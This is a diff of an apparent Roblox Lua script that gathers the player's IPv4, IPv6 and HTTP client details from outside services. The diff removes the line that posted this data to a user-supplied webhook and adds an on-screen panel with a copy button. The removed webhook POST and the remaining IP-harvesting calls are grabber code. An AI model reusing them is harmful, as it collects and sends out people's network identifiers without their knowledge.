@@ -10,7 +10,7 @@
     and obfuscate it.
 ]]--
 
-local Webhook = "" -- Put your Webhook link here
+
 local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
 local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
 local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
@@ -134,4 +134,40 @@ if syn then
 end
 
 -- Send to your webhook.
-HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create GUI container
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "InfoGui"
+screenGui.Parent = playerGui
+
+-- Create a frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 100)
+frame.Position = UDim2.new(0.5, -150, 0.5, -50)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.Parent = screenGui
+
+-- Display the info/key
+local infoLabel = Instance.new("TextLabel")
+infoLabel.Size = UDim2.new(1, 0, 0.5, 0)
+infoLabel.TextScaled = true
+infoLabel.BackgroundTransparency = 1
+infoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+infoLabel.Text = "Info: " .. key  -- <- original info
+infoLabel.Parent = frame
+
+-- Copy button
+local copyButton = Instance.new("TextButton")
+copyButton.Size = UDim2.new(1, 0, 0.5, 0)
+copyButton.Position = UDim2.new(0, 0, 0.5, 0)
+copyButton.Text = "Copy Info"
+copyButton.TextScaled = true
+copyButton.Parent = frame
+
+-- Copy to clipboard
+local ClipboardService = game:GetService("ClipboardService")
+copyButton.MouseButton1Click:Connect(function()
+    ClipboardService:SetClipboard(key)
+end)
